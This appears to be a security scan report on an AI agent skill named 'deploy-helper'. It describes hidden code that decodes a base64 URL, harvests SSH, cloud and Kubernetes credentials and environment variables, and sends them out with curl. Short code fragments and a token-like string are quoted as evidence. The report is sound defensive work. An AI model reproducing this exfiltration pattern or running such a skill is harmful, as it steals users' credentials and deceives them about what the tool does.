findings.title: Skill does not specify a license
Data Exfiltration via Encoded Network Call
findings.description: The skill contains Python code that decodes a base64-encoded URL and token, then sends a full environment configuration snapshot (including environment variables, SSH keys, AWS credentials, GCloud credentials, and Kubernetes config) to an external server via a POST request. This is a clear data exfiltration attempt.
findings.evidence: Base64-decoded URL: https://deploy-verify.internal.io/api/audit, Token: dv_sk_prod_29xKm4Pq. Code reads ~/.ssh, ~/.aws/credentials, ~/.config/gcloud/credentials.db, ~/.kube/config and sends them via curl.
findings.remediation: Remove the data collection and network transmission code entirely. Never send sensitive credentials or configuration to external servers.

findings.title: Credential Theft - Reading Sensitive Files
findings.description: The collect_full_config() function explicitly reads AWS credentials (~/.aws/credentials), GCloud credentials (~/.config/gcloud/credentials.db), and Kubernetes config (~/.kube/config), along with listing SSH keys. This is unauthorized credential harvesting.
findings.evidence: Code reads: ~/.aws/credentials, ~/.config/gcloud/credentials.db, ~/.kube/config, and lists ~/.ssh directory contents.
findings.remediation: Remove all code that reads credential files. The skill should not access any sensitive configuration files.

findings.title: Capability Inflation - Deceptive Skill Name and Description
findings.description: The skill is named 'deploy-helper' and described as assisting with deployment workflows, but its actual behavior includes credential theft and data exfiltration. The name and description are misleading to evade detection.
findings.evidence: Name: 'deploy-helper', Description: 'Assists with deployment workflows. Validates environment configuration, checks service health, and manages deployment artifacts.' Actual behavior: exfiltrates credentials and environment data.
findings.remediation: Rename and redescribe the skill to accurately reflect its purpose, or remove the malicious code entirely.

findings.title: Detection Evasion via Base64 Encoding
findings.description: The skill uses base64 encoding to hide the destination URL and authentication token, making it harder to detect the malicious network call during code review.
findings.remediation: Remove all obfuscated code. All network destinations and tokens should be transparent and documented.

findings.title: Tool Exploitation - Unauthorized Tool Use
findings.description: The skill uses subprocess to execute 'curl' commands for network communication, which is not declared in the manifest. The manifest does not specify allowed-tools, but the skill performs network operations without user awareness or consent.
findings.evidence: subprocess.run(['curl', '-s', '-X', 'POST', ...]) - executes curl command to send data to external server.
findings.remediation: Declare all tools used by the skill in the manifest. Network calls should require explicit user consent.

findings.title: Environment Variable Harvesting
findings.description: The skill collects all environment variables (dict(os.environ)) and transmits them to an external server. This includes potentially sensitive values like API keys, database URLs, and secrets.
findings.evidence: config['env_vars'] = dict(os.environ) - collects all environment variables.
findings.remediation: Only collect specific, non-sensitive environment variables that are necessary for the skill's stated purpose.

findings.title: Indirect Prompt Injection via Embedded Code
findings.description: The SKILL.md contains embedded Python code that executes automatically based on environment detection. This code contains malicious instructions that override the skill's stated benign purpose.
findings.evidence: Python code block in SKILL.md that executes data collection and exfiltration logic.
findings.remediation: Separate code from instructions. All code should be in separate script files with clear documentation of what it does.
